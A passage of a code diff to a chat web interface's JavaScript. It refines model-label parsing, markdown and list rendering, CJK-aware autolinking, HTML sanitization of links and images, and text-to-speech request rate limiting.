+  // `@custom:<model>` in the plain custom lane or `@custom:<slug>:<model>` for
+  // a named custom provider; the provider slug may itself be an endpoint
+  // authority (e.g. `custom:10.8.71.41:8080`). The model portion may contain
+  // colons (tag/variant suffixes like `:free`, `:31b`, `:397b`) and vendor
+  // slashes, so only the leading provider segment is peeled (#7240).
   // Examples:
-  //   @custom:ai_gateway:Qwen3.6-35B-A3B -> Qwen3.6-35B-A3B
-  //   @custom:qwen397b-64k               -> qwen397b-64k
+  //   @custom:ai_gateway:Qwen3.6-35B-A3B            -> Qwen3.6-35B-A3B
+  //   @custom:omni:kg/stepfun/step-3.7-flash:free    -> kg/stepfun/step-3.7-flash:free
+  //   @custom:qwen397b-64k                           -> qwen397b-64k
   if(rawId.startsWith('@custom:')){
     const rest=rawId.slice('@custom:'.length);
-    if(rest.includes(':')) return rest.slice(rest.lastIndexOf(':')+1)||rawId;
-    if(rest.includes('/')) return rest.slice(rest.indexOf('/')+1)||rawId;
-    return rest||rawId;
+    const sep=rest.indexOf(':');
+    if(sep<0) return rest||rawId;
+    // A provider slug is a config key or a host:port authority — it never
+    // contains a `/`. A slash-bearing first segment is therefore the model
+    // itself in the plain custom lane (`@custom:ollamacloud/qwen3.5:397b`
+    // must render the whole remainder, not just `397b`), mirroring the
+    // `/`-means-routable rule api/config.py applies when building ids.
+    if(rest.slice(0,sep).includes('/')) return rest||rawId;
+    let model=rest.slice(sep+1);
+    // Endpoint-style slug (`custom:10.8.71.41:8080:model`): the `:port` belongs
+    // to the provider segment, mirroring the host:port slug check in
+    // api/config.py, so it is consumed before the model label starts.
+    const portMatch=/^(\d{1,5}):/.exec(model);
+    if(portMatch){
+      const port=Number(portMatch[1]);
+      if(port>=1&&port<=65535){
+        const host=rest.slice(0,sep).toLowerCase();
+        if(host==='localhost'||host.includes('.')||/^\d{1,3}(\.\d{1,3}){3}$/.test(host)){
+          model=model.slice(portMatch[0].length);
+        }
+      }
+    }
+    return model||rawId;
   }
-  // Check dynamic labels first, then fall back to splitting the ID
-  if(_dynamicModelLabels[modelId]) return _dynamicModelLabels[modelId];
   // Static fallback for common models
   const STATIC_LABELS={'openai/gpt-5.4-mini':'GPT-5.4 Mini','openai/gpt-4o':'GPT-4o','openai/o3':'o3','openai/o4-mini':'o4-mini','anthropic/claude-sonnet-4.6':'Sonnet 4.6','anthropic/claude-sonnet-4-5':'Sonnet 4.5','anthropic/claude-haiku-3-5':'Haiku 3.5','google/gemini-3.1-pro-preview':'Gemini 3.1 Pro','google/gemini-3-flash-preview':'Gemini 3 Flash','google/gemini-3.1-flash-lite-preview':'Gemini 3.1 Flash Lite','google/gemini-2.5-pro':'Gemini 2.5 Pro','google/gemini-2.5-flash':'Gemini 2.5 Flash','deepseek/deepseek-v4-flash':'DeepSeek V4 Flash','deepseek/deepseek-v4-pro':'DeepSeek V4 Pro','deepseek/deepseek-chat-v3-0324':'DeepSeek V3 (legacy)','meta-llama/llama-4-scout':'Llama 4 Scout'};
   if(STATIC_LABELS[modelId]) return STATIC_LABELS[modelId];
@@ -7455,7 +8258,7 @@ function _stripXmlToolCallsDisplay(s){
   s=s.replace(/<(?:\s*｜\s*DSML\s*[｜|]\s*)?function_calls(?:>|$)[\s\S]*$/i,'');
   // Remove malformed DSML tag fragments like "<｜DSML |" that can leak in tokens.
   s=s.replace(/<\s*｜\s*DSML\s*[｜|]\s*/gi,'');
-  return s.trim();
+  return s.replace(/^\s+/, '');
 }
 
 function _sanitizeThinkingDisplayText(text){
@@ -7550,9 +8353,11 @@ function renderMd(raw){
   // generated images) and replace them with inline <img> or download links.
   // Stashed so the path/URL is never processed as markdown.
   const media_stash=[];
-  s=s.replace(/MEDIA:([^\s\)\]]+)/g,(_,raw_ref)=>{
-    media_stash.push(raw_ref);
-    return '\x00D'+(media_stash.length-1)+'\x00';
+  s=s.replace(/MEDIA:([^\s\)\]]+)/g,(token,raw_ref,offset)=>{
+    const parts=_mediaTokenParts(s,offset,raw_ref);
+    if(!parts) return token;
+    media_stash.push(parts[0]);
+    return '\x00D'+(media_stash.length-1)+'\x00'+parts[1];
   });
   // ── End MEDIA stash ─────────────────────────────────────────────────────────
   // Pre-pass: decode HTML entities first so markdown processing works correctly.
@@ -7665,10 +8470,43 @@ function renderMd(raw){
   });
   s=s.replace(/<strong>([\s\S]*?)<\/strong>/gi,(_,t)=>'**'+t+'**');
   s=s.replace(/<b>([\s\S]*?)<\/b>/gi,(_,t)=>'**'+t+'**');
-  s=s.replace(/<em>([\s\S]*?)<\/em>/gi,(_,t)=>'*'+t+'*');
-  s=s.replace(/<i>([\s\S]*?)<\/i>/gi,(_,t)=>'*'+t+'*');
+  // Keep boundary whitespace OUTSIDE the generated *...* delimiters: the inline
+  // emphasis regex below deliberately rejects a leading/trailing space (so
+  // `a * b * c` is not italicised), and `<em> x </em>` would otherwise degrade
+  // into literal asterisks (or a bullet list at line start).
+  const _emphasis=(t)=>{
+    const m=String(t).match(/^(\s*)([\s\S]*?)(\s*)$/);
+    return (m && m[2]) ? m[1]+'*'+m[2]+'*'+m[3] : t;
+  };
+  s=s.replace(/<em>([\s\S]*?)<\/em>/gi,(_,t)=>_emphasis(t));
+  s=s.replace(/<i>([\s\S]*?)<\/i>/gi,(_,t)=>_emphasis(t));
   s=s.replace(/<code>([^<]*?)<\/code>/gi,(_,t)=>'`'+t+'`');
-  s=s.replace(/<br\s*\/?>/gi,'\n');
+  // Convert <br> to a newline, EXCEPT inside genuine markdown table rows — there a
+  // newline would split the row and destroy the table. No sentinel token is used on
+  // purpose: any fixed placeholder is attacker-suppliable in message text and would be
+  // rewritten on the way out.
+  // The "is this a table row" test must match the DOWNSTREAM table parser's grammar
+  // exactly (a run of pipe-lines whose SECOND line is a separator). A looser per-line
+  // test would treat pipe-wrapped prose like `| note<br># heading |` as a table row and
+  // silently strip its heading/list rendering.
+  {
+    const _rowRe=/^ {0,3}\|.+\|[ \t]*$/;
+    const _sepRe=/^\|[\s|:-]+\|$/;
+    const _lines=s.split('\n');
+    const _isTableRow=new Array(_lines.length).fill(false);
+    for(let i=0;i<_lines.length;){
+      if(!_rowRe.test(_lines[i])){ i++; continue; }
+      let j=i;
+      while(j<_lines.length && _rowRe.test(_lines[j])) j++;
+      // A block qualifies only if the parser would accept it: >=2 rows and a separator
+      // in the second position.
+      if(j-i>=2 && _sepRe.test(_lines[i+1].trim())){
+        for(let k=i;k<j;k++) _isTableRow[k]=true;
+      }
+      i=j;
+    }
+    s=_lines.map((line,i)=>_isTableRow[i]?line:line.replace(/<br\s*\/?>/gi,'\n')).join('\n');
+  }
   // ── Glued-bold-heading lift (issue #1446) ────────────────────────────────
   // LLMs in thinking/reasoning mode frequently emit a "section header" glued
   // to the end of the previous paragraph with no whitespace, like:
@@ -7697,6 +8535,105 @@ function renderMd(raw){
   // Inline backtick spans: restore <code> tags produced in the stash callback above.
   // Must happen BEFORE bold/italic so **`code`** → <strong><code>code</code></strong>.
   s=s.replace(/\x00F(\d+)\x00/g,(_,i)=>fence_stash[+i]);
+  function _isCjkAutolinkChar(ch){
+    return /[\u3040-\u30ff\u3400-\u9fff\uac00-\ud7af]/.test(ch||'');
+  }
+  // Return one URL's exclusive end inside a maximal whitespace-free URL run.
+  // nextCjk and nextQuery are suffix tables shared by every URL in that run.
+  function _bareAutolinkEnd(run,start,nextCjk,nextQuery){
+    const schemeEnd=run.indexOf('://',start)+3;
+    let authorityEnd=schemeEnd;
+    while(authorityEnd<run.length&&!/[/?#]/.test(run[authorityEnd])) authorityEnd++;
+    const pathStart=run[authorityEnd]==='/'?authorityEnd:-1;
+    const queryFragmentStart=nextQuery[schemeEnd];
+    const firstCjkPath=pathStart<0?-1:nextCjk[pathStart];
+    const firstCjkQuery=queryFragmentStart<0?-1:nextCjk[queryFragmentStart+1];
+    // Closing marks and sentence punctuation end a URL. Full-width OPENING
+    // marks（【「『 also end it: prose such as `…/pull/8040（OPEN、…` starts
+    // there. The raw-CJK-path guard further down still keeps interior marks
+    // of genuine IRIs (for example `…/wiki/スター（映画）`).
+    const boundaryMarks='，。．｡；：！？、）】」》〕（【「『';
+    let currentLabelStart=schemeEnd;
+    for(let i=schemeEnd;i<run.length;i++){
+      const mark=run[i];
+      if(mark==='.'){currentLabelStart=i+1;continue;}
+      if(!boundaryMarks.includes(mark)) continue;
+      if(run.startsWith('http://',i+1)||run.startsWith('https://',i+1)) return i;
+      // U+FF0E and U+FF61 are ordinary IRI characters outside the authority.
+      // Keep them in paths, queries, and fragments just as master does.
+      if((mark==='．'||mark==='｡')&&i>=authorityEnd) continue;
+      // UTS #46 maps these three authority characters to an ASCII dot. They
+      // are label separators before an ASCII label. Also retain a CJK label
+      // when the host prefix already contains raw CJK; this covers real IDNs
+      // such as 例子。中国 without mistaking example.com。参见docs/ for one.
+      if((mark==='。'||mark==='．'||mark==='｡')&&i<authorityEnd
+         &&i+1<authorityEnd){
+        if(/[A-Za-z0-9_\-]/.test(run[i+1])){currentLabelStart=i+1;continue;}
+        // Keep a Unicode label when this is the first host separator, when the
+        // immediately preceding label is itself Unicode (www.例子。中国), or when the
+        // next label starts with a non-CJK script letter (www.example。рф). CJK,
+        // Common-script and fullwidth characters after an ASCII label are prose, so
+        // `example.com。参见` / `example.com．次に進む` / `example.com。２０２４年` still end
+        // at the TLD.
+        const firstLabelChar=String.fromCodePoint(run.codePointAt(i+1));
+        let unicodeLabel=currentLabelStart===schemeEnd
+          ||(/\p{L}/u.test(firstLabelChar)
+             &&!/[A-Za-z\p{Script=Common}\p{Script=Inherited}\uFF00-\uFFEF]/u.test(firstLabelChar)
+             &&!_isCjkAutolinkChar(firstLabelChar)
+             &&!/[\p{Script_Extensions=Han}\p{Script_Extensions=Hiragana}\p{Script_Extensions=Katakana}\p{Script_Extensions=Hangul}\p{Script_Extensions=Bopomofo}]/u.test(firstLabelChar));
+        for(let j=currentLabelStart;!unicodeLabel&&j<i;){
+          const c=String.fromCodePoint(run.codePointAt(j));
+          unicodeLabel=/[\p{L}\p{M}\p{N}]/u.test(c)
+            &&!/[A-Za-z0-9]/.test(c);
+          j+=c.length;
+        }
+        for(let j=i+1;unicodeLabel&&j<authorityEnd;){
+          const c=String.fromCodePoint(run.codePointAt(j));
+          if(c==='.'||c===':'||boundaryMarks.includes(c)) break;
+          unicodeLabel=/[\p{L}\p{M}\p{N}_\-]/u.test(c);
+          j+=c.length;
+        }
+        if(unicodeLabel){currentLabelStart=i+1;continue;}
+      }
+      // Preserve marks in a query/fragment after raw CJK content. ASCII
+      // fragment continuations are also common section identifiers. A mark
+      // before the first CJK character remains a prose boundary, so
+      // `?q=1，参见` does not swallow the following sentence.
+      if(queryFragmentStart>=0&&i>queryFragmentStart&&i<run.length-1){
+        if((firstCjkQuery>=0&&firstCjkQuery<i)
+           ||(run[queryFragmentStart]==='#'&&/[A-Za-z0-9_\-]/.test(run[i+1]))) continue;
+        return i;
+      }
+      // Once a path contains raw CJK, interior CJK punctuation is a plausible
+      // IRI character, but it must not override a later query boundary.
+      if(firstCjkPath>=0&&firstCjkPath<i
+         &&(queryFragmentStart<0||i<queryFragmentStart)&&i<run.length-1) continue;
+      return i;
+    }
+    return /[.,;:!?)]$/.test(run)?run.length-1:run.length;
+  }
+  function _autolinkBareRun(run){
+    const nextCjk=new Int32Array(run.length+1);
+    const nextQuery=new Int32Array(run.length+1);
+    nextCjk[run.length]=-1;
+    nextQuery[run.length]=-1;
+    for(let i=run.length-1;i>=0;i--){
+      nextCjk[i]=_isCjkAutolinkChar(run[i])?i:nextCjk[i+1];
+      nextQuery[i]=(run[i]==='?'||run[i]==='#')?i:nextQuery[i+1];
+    }
+    const schemeRe=/https?:\/\//g;
+    let out='';
+    let cursor=0;
+    let match;
+    while((match=schemeRe.exec(run))){
+      out+=run.slice(cursor,match.index);
+      const end=_bareAutolinkEnd(run,match.index,nextCjk,nextQuery);
+      out+=_autolinkAnchor(run.slice(match.index,end));
+      cursor=end;
+      schemeRe.lastIndex=end;
+    }
+    return out+run.slice(cursor);
+  }
   // inlineMd: process bold/italic/code/links within a single line of text.
   // Used inside list items and blockquotes where the text may already contain
   // HTML from the pre-pass → bold pipeline, so we cannot call esc() directly.
@@ -7706,7 +8643,7 @@ function renderMd(raw){
     t=t.replace(/`([^`\n]+)`/g,(_,x)=>{_code_stash.push(`<code>${esc(x)}</code>`);return `\x00C${_code_stash.length-1}\x00`;});
     t=t.replace(/\*\*\*(.+?)\*\*\*/g,(_,x)=>`<strong><em>${esc(x)}</em></strong>`);
     t=t.replace(/\*\*(.+?)\*\*/g,(_,x)=>`<strong>${esc(x)}</strong>`);
-    t=t.replace(/\*([^*\n]+)\*/g,(_,x)=>`<em>${esc(x)}</em>`);
+    t=t.replace(/\*([^\s*](?:[^*\n]*?[^\s*])?)\*/g,(_,x)=>`<em>${esc(x)}</em>`);
     // Strikethrough: ~~text~~ → <del>text</del>
     t=t.replace(/~~(.+?)~~/g,(_,x)=>`<del>${esc(x)}</del>`);
     // #487: Image pass — runs while code stash is active so ![x](url) inside
@@ -7721,12 +8658,12 @@ function renderMd(raw){
     // Stash [label](url) links before autolink so the URL in href= is not re-linked
     const _link_stash=[];
     t=t.replace(/\[([^\]]+)\]\(((?:https?:\/\/|file:\/\/|workspace:\/\/|session:\/\/|mailto:|tel:|message:)[^\s\)]+)\)/g,(_,lb,u)=>{_link_stash.push(_markdownAnchor(lb,u));return `\x00L${_link_stash.length-1}\x00`;});
-    t=t.replace(/(https?:\/\/[^\s<>"')\]\uFF09]+)/g,(url)=>{const trail=url.match(/[.,;:!?)\uFF09\uFF0C\uFF1B\uFF1A\uFF01\uFF1F\u3001\u3002]$/)?url.slice(-1):'';const clean=trail?url.slice(0,-1):url;return `<a href="${clean}" target="_blank" rel="noopener">${esc(clean)}</a>${trail}`;});
+    t=_autolinkBareText(t);
     t=t.replace(/\x00L(\d+)\x00/g,(_,i)=>_link_stash[+i]);
     t=t.replace(/\x00G(\d+)\x00/g,(_,i)=>_img_stash[+i]);
     // Escape any plain text that isn't already wrapped in a tag we produced
     // by escaping bare < > that are not part of our own tags
-    const SAFE_INLINE=/^<\/?(strong|em|del|code|a|img)([\s>]|$)/i;
+    const SAFE_INLINE=/^<\/?(strong|em|del|code|a|img|br)([\s>]|$)/i;
     t=t.replace(/<\/?[a-z][^>]*>/gi,tag=>SAFE_INLINE.test(tag)?tag:esc(tag));
     return t;
   }
@@ -7736,55 +8673,104 @@ function renderMd(raw){
   s=s.replace(/(<code\b[^>]*>[\s\S]*?<\/code>)/g,m=>{_ob_stash.push(m);return `\x00O${_ob_stash.length-1}\x00`;});
   s=s.replace(/\*\*\*(.+?)\*\*\*/g,(_,t)=>`<strong><em>${esc(t)}</em></strong>`);
   s=s.replace(/\*\*(.+?)\*\*/g,(_,t)=>`<strong>${esc(t)}</strong>`);
-  s=s.replace(/\*([^*\n]+)\*/g,(_,t)=>`<em>${esc(t)}</em>`);
+  s=s.replace(/\*([^\s*](?:[^*\n]*?[^\s*])?)\*/g,(_,t)=>`<em>${esc(t)}</em>`);
   s=s.replace(/~~(.+?)~~/g,(_,t)=>`<del>${esc(t)}</del>`);
   s=s.replace(/\x00O(\d+)\x00/g,(_,i)=>_ob_stash[+i]);
   s=s.replace(/^###### (.+)$/gm,(_,t)=>`<h6>${inlineMd(t)}</h6>`).replace(/^##### (.+)$/gm,(_,t)=>`<h5>${inlineMd(t)}</h5>`).replace(/^#### (.+)$/gm,(_,t)=>`<h4>${inlineMd(t)}</h4>`).replace(/^### (.+)$/gm,(_,t)=>`<h3>${inlineMd(t)}</h3>`).replace(/^## (.+)$/gm,(_,t)=>`<h2>${inlineMd(t)}</h2>`).replace(/^# (.+)$/gm,(_,t)=>`<h1>${inlineMd(t)}</h1>`);
   s=s.replace(/^---+$/gm,'<hr>');
   // (Blockquotes are handled by the pre-pass at the top of renderMd, before
   // fence_stash. The per-line passes below never see > prefixes.)
-  function _renderListBlock(lines, ordered){
-    const marker=ordered?'\\d+\\. ':'[-*+] ';
-    let html=ordered?'<ol>':'<ul>';
-    let item=null;
-    const flush=()=>{
-      if(!item) return;
-      const body=item.parts.join('\n').trim();
-      const text=body;
-      let inner;
-      if(!ordered && /^\[x\] /i.test(text)) inner='<span class="task-done">✅</span> '+inlineMd(text.slice(4));
-      else if(!ordered && /^\[ \] /.test(text)) inner='<span class="task-todo">☐</span> '+inlineMd(text.slice(4));
-      else inner=inlineMd(text);
-      const valueAttr=item.value!==null?` value="${item.value}"`:'';
-      const styleAttr=item.indent?` style="margin-left:16px"`:'';
-      html+=`<li${valueAttr}${styleAttr}>${inner}</li>`;
-      item=null;
+  function _renderListBlock(lines){
+    // Single-pass mixed-marker list renderer (#6700). Builds a real nested
+    // <ul>/<ol> tree with a stack keyed by indentation depth + marker kind
+    // instead of rendering one marker family and re-parsing the generated
+    // HTML with the other. Only item text goes through inlineMd(); tags
+    // emitted here are never parsed as Markdown again.
+    const root={ordered:false,items:[]};   // container for top-level lists
+    const listStack=[];                    // listStack[k]: list open at depth k
+    const itemStack=[];                    // itemStack[k]: last item at depth k
+    const openList=(depth,ordered)=>{
+      const ln={ordered,items:[]};
+      // Attach to the nearest open ancestor item when indentation jumps by
+      // more than one level (e.g. 4-space indent straight from the top), so
+      // the new list nests under the right parent instead of detaching.
+      let parentItem=null;
+      for(let k=depth-1;k>=0;k--){
+        if(itemStack[k]){ parentItem=itemStack[k]; break; }
+      }
+      (parentItem?parentItem.sublists:root.items).push(ln);
+      listStack[depth]=ln;
+      return ln;
+    };
+    const openItem=(depth,ordered,value,content)=>{
+      for(let k=listStack.length-1;k>depth;k--) listStack.pop();
+      if(!listStack[depth]||listStack[depth].ordered!==ordered){
+        if(listStack[depth]) listStack.pop();
+        listStack[depth]=openList(depth,ordered);
+      }
+      const item={ordered,value,content:[content],sublists:[]};
+      listStack[depth].items.push(item);
+      itemStack[depth]=item;
+      for(let k=itemStack.length-1;k>depth;k--) itemStack.pop();
+      return item;
     };
     for(const raw of lines){
       const line=String(raw||'');
-      const nested=line.match(new RegExp(`^ {2,}(${marker})(.*)$`));
-      if(nested){
-        flush();
-        item={indent:true,value:ordered?parseInt(nested[1],10):null,parts:[nested[2]]};
-        continue;
+      const om=line.match(/^(\s*)(\d+)\.\s+(.*)$/);
+      const um=line.match(/^(\s*)([-*+])\s+(.*)$/);
+      const m=om||um;
+      if(m){
+        const depth=m[1].length<2?0:Math.floor(m[1].length/2);
+        openItem(depth,!!om,om?parseInt(om[2],10):null,m[3]);
+      } else if(itemStack.length){
+        itemStack[itemStack.length-1].content.push(line.replace(/^ {2,}/,'').trim());
       }
-      const top=line.match(new RegExp(`^(?:  )?(${marker})(.*)$`));
-      if(top){
-        flush();
-        item={indent:false,value:ordered?parseInt(top[1],10):null,parts:[top[2]]};
-        continue;
-      }
-      if(!item) continue;
-      item.parts.push(line.replace(/^ {2,}/,'').trim());
     }
-    flush();
-    return html+(ordered?'</ol>':'</ul>');
+    // Iterative depth-first emit (#6700 re-gate). The recursive
+    // renderList/renderItem pair recursed once per nesting level, so a
+    // pathologically deep list (an agent dumping deeply nested structured
+    // data) threw RangeError at ~2,000 levels; renderMd() runs after the
+    // transcript container is cleared, so the uncaught throw blanked the
+    // whole session. Emit order is identical — list open, items, nested
+    // sublists, item close, list close — but sublists are pushed onto an
+    // explicit work stack instead of the call stack.
+    const html=[];
+    const work=[];                                  // {open:list} | {item} | {close:list} | {closeItem:true}
+    for(let i=root.items.length-1;i>=0;i--) work.push({open:root.items[i]});
+    while(work.length){
+      const f=work.pop();
+      if(f.item){
+        const it=f.item;
+        const text=it.content.join('\n').trim();
+        let inner;
+        if(!it.ordered && /^\[x\] /i.test(text)) inner='<span class="task-done">✅</span> '+inlineMd(text.slice(4));
+        else if(!it.ordered && /^\[ \] /.test(text)) inner='<span class="task-todo">☐</span> '+inlineMd(text.slice(4));
+        else inner=inlineMd(text);
+        const valueAttr=it.value!==null?` value="${it.value}"`:'';
+        html.push(`<li${valueAttr}>`,inner);
+        work.push({closeItem:true});                // </li> after any nested sublists
+        for(let i=it.sublists.length-1;i>=0;i--) work.push({open:it.sublists[i]});
+      } else if(f.closeItem){
+        html.push('</li>');
+      } else if(f.open){
+        const ln=f.open;
+        html.push('<',ln.ordered?'ol':'ul','>');
+        work.push({close:ln});                      // </ul>/</ol> after all items
+        for(let i=ln.items.length-1;i>=0;i--) work.push({item:ln.items[i]});
+      } else {
+        html.push('</',f.close.ordered?'ol':'ul','>');
+      }
+    }
+    return html.join('');
   }
-  function _renderLists(src, ordered){
+  function _renderLists(src){
+    // Single pass over source lines: collect a contiguous list region (any
+    // marker family, top-level or nested, plus continuation lines) and hand
+    // it to _renderListBlock, which builds the structural <ul>/<ol> tree.
     const lines=src.split('\n');
     const out=[];
-    const topRe=ordered?/^(?:  )?\d+\. /:/^(?:  )?[-*+] /;
-    const nestedRe=ordered?/^ {2,}\d+\. /:/^ {2,}[-*+] /;
+    const topRe=/^(?:  )?(?:\d+\.|[-*+]) /;
+    const nestedRe=/^ {2,}(?:\d+\.|[-*+]) /;
     const contRe=/^ {2,}\S/;
     let i=0;
     while(i<lines.length){
@@ -7811,18 +8797,16 @@ function renderMd(raw){
         }
         break;
       }
-      out.push(_renderListBlock(block,ordered));
+      out.push(_renderListBlock(block));
     }
     return out.join('\n');
   }
-  // Preserve continuation lines, nested indentation, and LaTeX placeholder lines
-  // inside list items without changing the wider markdown pipeline.
-  s=_renderLists(s,false);
-  // Ordered-list parsing intentionally runs on the post-unordered string; the
-  // unordered pass emits <ul> HTML that cannot satisfy the ordered-item regex.
-  // Keep continuation lines attached to their item and preserve explicit
-  // numbering via value= even when blank lines split the markdown.
-  s=_renderLists(s,true);
+  // Single-pass list stage (#6700): one parser handles both marker families
+  // with a stack keyed by indentation + marker kind, so mixed nested lists
+  // (ul→ol→ul) build valid <ul>/<ol> structure instead of re-parsing
+  // renderer-generated HTML as Markdown. value="N" is still emitted on every
+  // ordered <li> so explicit numbering survives blank-line splits (#886).
+  s=_renderLists(s);
   // Tables: | col | col | header row followed by | --- | --- | separator then data rows
   // NOTE: table pass runs BEFORE outer link pass so [label](url) in table cells
   // is handled by inlineMd() only — prevents double-linking.
@@ -7985,8 +8969,7 @@ function renderMd(raw){
     const a=_attrs(rawAttrs);
     if(name==='li'){
       const value=/^\d+$/.test(a.value||'')?` value="${esc(a.value)}"`:'';
-      const style=(a.style||'').replace(/\s+/g,'').toLowerCase()==='margin-left:16px'?` style="margin-left:16px"`:'';
-      return `<li${value}${style}>`;
+      return `<li${value}>`;
     }
     if(name==='span'){
       return `<span${_cls(a.class,['task-done','task-todo','katex-inline'])}${a['data-katex']==='inline'?' data-katex="inline"':''}>`;
@@ -8003,10 +8986,28 @@ function renderMd(raw){
       const rel=a.rel==='noopener'?' rel="noopener"':'';
       const cls=_cls(a.class,['msg-media-link','skill-linked-file','skill-file-back','session-link']);
       const download=a.download?` download="${esc(a.download)}"`:'';
-      return `<a${cls} href="${esc(_safeAttrValue(a.href))}"${target}${rel}${download}>`;
+      // #7941: keep the blocked-remote-image tooltip only on a media chip whose
+      // href really is a non-allowlisted remote image AND whose title begins with
+      // the reason computed from that same href, so model-authored anchors cannot
+      // carry arbitrary tooltips.
+      let tipAttr='';
+      if(a.title&&cls.includes('msg-media-link')&&typeof _remoteImageAllowed==='function'
+         &&typeof _remoteImageReason==='function'){
+        const href=_safeAttrValue(a.href);
+        const tip=_safeAttrValue(a.title);
+        const reason=/^https?:\/\//i.test(href)&&!_remoteImageAllowed(href)?_remoteImageReason(href):'';
+        // Exactly the shapes _remoteImagePlaceholderHtml emits: the reason, or the
+        // reason followed by " (<alt>)".
+        // The producer caps alt at 120 chars; re-admit no longer suffix than that.
+        if(reason&&(tip===reason||(tip.startsWith(reason+' (')&&tip.endsWith(')')&&tip.length<=reason.length+123))){
+          tipAttr=` title="${esc(tip)}"`;
+        }
+      }
+      return `<a${cls} href="${esc(_safeAttrValue(a.href))}"${target}${rel}${download}${tipAttr}>`;
     }
     if(name==='img'){
       if(!_isSafeUrl(a.src,true)) return '';
+      if(typeof _remoteImageAllowed==='function'&&!_remoteImageAllowed(_safeAttrValue(a.src))) return _remoteImagePlaceholderHtml(_safeAttrValue(a.src), _safeAttrValue(a.alt||''));
       const cls=_cls(a.class,['msg-media-img']);
       const alt=` alt="${esc(_safeAttrValue(a.alt||''))}"`;
       const loading=a.loading==='lazy'?' loading="lazy"':'';
@@ -8019,18 +9020,23 @@ function renderMd(raw){
   // renderer's generated </p> could provide a closing ">" and turn them into
   // executable HTML in innerHTML (for example: <img src=x onerror=...//).
   s=s.replace(/<[a-zA-Z][\w:-]*[^>\n]*$/gm,tag=>esc(tag));
-  // Autolink: convert plain URLs to clickable links.
+  // Autolink: convert plain URLs to clickable links. Both inline and block
+  // rendering use this helper so their boundary and safety rules stay equal.
+  function _autolinkAnchor(clean){
+    return `<a href="${clean}" target="_blank" rel="noopener">${esc(clean)}</a>`;
+  }
+  function _autolinkBareText(text){
+    return String(text||'').replace(
+      /(https?:\/\/[^\s<>"')\]\uFF09]+)/g,
+      run=>_autolinkBareRun(run),
+    );
+  }
   // Stash <a>, <img> and <pre> blocks so autolink never runs inside them.
   const _al_stash=[];
   s=s.replace(/(<a\b[^>]*>[\s\S]*?<\/a>|<img\b[^>]*>|<pre\b[^>]*>[\s\S]*?<\/pre>)/g,m=>{_al_stash.push(m);return `\x00B${_al_stash.length-1}\x00`;});
-  s=s.replace(/(https?:\/\/[^\s<>"')\]\uFF09]+)/g,(url)=>{
-    // Strip trailing punctuation that was likely not part of the URL.
-    // CJK full-width punctuation (）。，；：！？、) is included because LLMs
-    // frequently use full-width delimiters in Chinese/Japanese text.
-    const trail=url.match(/[.,;:!?)]$/)||url.match(/[\uFF09\uFF0C\uFF1B\uFF1A\uFF01\uFF1F\u3001\u3002]$/)?url.slice(-1):'';
-    const clean=trail?url.slice(0,-1):url;
-    return `<a href="${clean}" target="_blank" rel="noopener">${esc(clean)}</a>${trail}`;
-  });
+  // Split high-confidence sentence boundaries while preserving valid CJK IRI
+  // content, then rescan each plain-text trail so adjacent URLs all link.
+  s=_autolinkBareText(s);
   s=s.replace(/\x00B(\d+)\x00/g,(_,i)=>_al_stash[+i]);
   // Restore math stash → katex placeholder spans/divs
   // These will be rendered by renderKatexBlocks() after DOM insertion
@@ -8918,6 +9924,12 @@ function _stripForTTS(text){
   // Strip links, keep text
   text=text.replace(/\[([^\]]+)\]\([^)]+\)/g,'$1');
   // Replace MEDIA: paths with a simple label
+  // #7680 re-gate (9/22): TTS does not need the backtick-aware
+  // terminator. Inline code was already stripped at the top of this
+  // function (`:9137`), so a bare ``MEDIA:[^\s]+`` is correct and
+  // round-trips the original filename including a backtick in the
+  // path — the only thing the TTS ever does with the captured
+  // substring is throw it away.
   text=text.replace(/MEDIA:[^\s]+/g,'a file');
   // Strip emoji and emoticons
   text=text.replace(/[\u{1F600}-\u{1F64F}\u{1F300}-\u{1F5FF}\u{1F680}-\u{1F6FF}\u{1F1E0}-\u{1F1FF}\u{2600}-\u{26FF}\u{2700}-\u{27BF}\u{FE00}-\u{FE0F}\u{1F900}-\u{1F9FF}\u{1FA00}-\u{1FA6F}\u{1FA70}-\u{1FAFF}\u{200D}]/gu,'');
@@ -8953,13 +9965,99 @@ function _splitForTTS(text, maxChars){
 }
 
 let _ttsSpeaking=false;
+let _ttsGeneration=0;
+// Every playback claims a generation token before it produces audio. Any
+// replacement — and stopTTS() — invalidates all prior tokens, and every
+// asynchronous callback must verify ownership before mutating shared state.
+// `_ttsSpeaking` alone cannot distinguish playback A from playback B.
+function _beginTtsPlayback(){ _ttsSpeaking=true; return ++_ttsGeneration; }
+function _ownsTtsPlayback(gen){ return gen===_ttsGeneration; }
+// Minimum gap between consecutive /api/tts synthesis requests, matching the
+// server-side per-client window in api/routes.py (_TtsRateLimiter, 2 s).
+// Shared by every engine and generation — the server limiter is per-client
+// across ALL /api/tts requests, not per engine. Overridable (small values) by
+// tests that drive playback under node.
+let _ttsRequestMinGapMs=2000;
+// Client-wide timestamp of the last /api/tts request actually sent (any
+// engine, any generation). The server limiter (api/routes.py _TtsRateLimiter)
+// is per-client across ALL TTS requests, so pacing must account for requests
+// issued by any playback — one that starts inside another request's cooldown
+// must wait instead of hitting HTTP 429.
+let _ttsLastRequestTs=0;
+function _noteTtsRequestSent(){ _ttsLastRequestTs=Date.now(); }
+function _ttsRequestWaitMs(){
+  if(_ttsLastRequestTs===0) return 0;
+  const elapsed=Date.now()-_ttsLastRequestTs;
+  return elapsed>=_ttsRequestMinGapMs?0:_ttsRequestMinGapMs-elapsed;
+}
+// ONE scheduler for every server-backed TTS request (any engine, any
+// generation, any entry point — Listen button, auto-read, voice mode). The
+// slot is reserved at send time and re-checked whenever a waiter wakes:
+// several waiters waking together cannot stampede the window — the first
+// reserves, the rest wait again. `owner()` guards abandoned playbacks: a
+// cancelled chain resolves false instead of stealing the slot.
+function _acquireTtsRequestSlot(owner){
+  return new Promise(function(resolve){
+    function _attempt(){
+      if(owner&&!owner()){ resolve(false); return; }
+      const wait=_ttsRequestWaitMs();
+      if(wait<=0){ _noteTtsRequestSent(); resolve(true); return; }
+      setTimeout(_attempt, wait);
+    }
+    _attempt();
+  });
+}
+// Shared /api/tts sender: waits for the shared slot, sends, and applies a
+// bounded, owner-aware retry on HTTP 429 (the server window can outlive this
+// client's clock estimate — e.g. requests from another tab). Settles to
+// {ok:true, buf} / {ok:false, err} so callers never surface abandoned-
+// generation errors as unhandled rejections.
+function _sendTtsRequest(init, owner){
+  let attempt=0;
+  function _dispatch(){
+    return _acquireTtsRequestSlot(owner).then(function(reserved){
